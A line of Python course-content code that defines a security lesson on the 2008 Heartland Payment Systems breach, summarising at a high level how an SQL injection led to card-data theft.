    l7_1 = Lesson(module_id=m7.id, order_index=1, title="Case Study: Heartland Payment Systems (2008)", narrative="**Narrative**: *In 2008, Heartland Payment Systems — one of the largest credit card processors in the US — suffered the biggest data breach in history at the time.*\\n**The Facts**:\\n**Attack Chain**:\\n**Lesson**: A single SQL injection vulnerability in a web form led to the largest credit card breach in history. The attacker didn't stop at the database — SQL injection was just the **entry point**.", code_snippet="1. SQL injection on public website\\n   ↓\\n2. Gained access to internal network\\n   ↓\\n3. Installed packet sniffing malware\\n   ↓\\n4. Intercepted credit card data in transit\\n   ↓\\n5. 130 million cards compromised", code_language="", table_data=None)
